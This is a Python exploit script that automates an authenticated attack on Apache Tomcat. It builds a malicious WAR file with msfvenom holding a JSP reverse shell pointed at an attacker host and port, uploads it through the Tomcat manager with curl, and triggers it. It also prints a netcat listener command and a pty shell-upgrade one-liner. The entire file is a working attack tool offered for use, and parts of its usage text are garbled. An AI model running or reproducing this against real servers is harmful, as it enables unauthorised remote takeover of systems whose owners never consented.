#!/usr/bin/env python3
import requests
import urllib3
import sys
import string
import argparse
import os



print('''  _______                        _   ___             
 |__   __|                      | | / _ \            
    | | ___  _ __ ___   ___ __ _| || (_) |           
    | |/ _ \| '_ ` _ \ / __/ _` | __\__, |           
    | | (_) | | | | | | (_| (_| | |_  / /            
  __|_|\___/|_| |_| |_|\___\__,_|\__|/_/   __        
 |  __ \           | |         \ \        / /        
 | |  | | ___ _ __ | | ___  _   \ \  /\  / /_ _ _ __ 
 | |  | |/ _ \ '_ \| |/ _ \| | | \ \/  \/ / _` | '__|
 | |__| |  __/ |_) | | (_) | |_| |\  /\  / (_| | |   
 |_____/ \___| .__/|_|\___/ \__, | \/  \/ \__,_|_|   
             | |             __/ |                   
             |_|            |___/                    


    -by zer0bubble & frees3c
    ''')
print("usage - python3 exploit.py -u <user> -p '<password>' -t 10.10.10.1 -P 8080 -Lh <local IP> -Lp <port> ")
print("-t target url without http:// ex. -u 127.0.0.1")
print("-p port ")
print("-u user")
print("-p password  place in ' ' ")
print("-Lp LPORT for payload to code to")
print("-Lh LHOST for payload to code to")

password = ""
user_name = ""



parser = argparse.ArgumentParser("Tomcat Authenticated .war upload/shell trigger")
parser.add_argument('-t', nargs='?', metavar='target', help='Target IP Address.')
parser.add_argument('-P', nargs='?', metavar='port', help='Target Port.')
parser.add_argument('-p', nargs='?', metavar='password', help='Tomcat Administrative Password.')
parser.add_argument('-u', nargs='?', metavar='user', help='Tomcat Administrative User.')
parser.add_argument('-Lh', nargs='?', metavar='HOST', help='LHOST.')
parser.add_argument('-Lp', nargs='?', metavar='PORT', help='LPORT.')
args = parser.parse_args()

print("preparing payload")

HOST = args.Lh
PORT = args.Lp
print("malicious war file being crafted")
print("be patient sleeping while file is created")
WAR = "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s + LPORT=%s -f war > shell.war" % (HOST, PORT)
os.system(WAR)
os.system("sleep 35")
print("payload created, configuring target")

#sets the base URL
targeturl = args.t
targetport = args.P
base_url = "http://%s:%s" % (targeturl, targetport)
print("Targeting base URL " + base_url)

#sets deployment of war command
password = args.p
user_name = args.u
target = args.t
port = args.P
FULLTARGET = "curl --upload-file shell.war 'http://%s:%s@%s:%s/manager/text/deploy?path=/shell&update=true'" % (user_name, password, target, port)
print("uploading payload to target")
print("ensure you have your reverse shell running")
print("set nc -lvnp " + HOST + " " + PORT)
os.system(FULLTARGET)

print("allowing time to upload")
os.system("sleep 3")
print("triggering reverse shell")
triggercommand = "curl %s/shell/" % (base_url)
os.system(triggercommand)
shellstab = "shell stabalization python3 -c 'import pty;pty.spawn('/bin/bash')'"
print(shellstab)
